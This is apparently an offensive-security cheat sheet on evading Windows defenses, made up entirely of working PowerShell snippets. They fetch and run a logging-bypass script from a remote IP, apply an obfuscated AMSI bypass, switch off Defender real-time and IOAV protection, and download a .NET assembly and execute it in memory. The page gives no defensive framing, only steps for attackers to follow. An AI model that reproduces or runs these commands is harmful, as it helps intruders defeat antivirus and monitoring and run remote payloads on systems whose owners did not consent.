# Evasion

### Bypass AMSI

First bypass the Enhanced Script Block Logging

```powershell
iex (iwr http://172.16.99.115/sbloggingbypass.txt -UseBasicParsing)
```

To bypass the AMSI

{% code overflow="wrap" %}
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
{% endcode %}

### Disable AV

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
Set-MpPreference -DisableIOAVprotection $true -Verbose
```

### Execute exe

bypass amsi and then

{% code overflow="wrap" %}
```powershell
$data=(New-Object System.Net.WebClient).DownloadData('<URL>');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[<Program>.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```
{% endcode %}
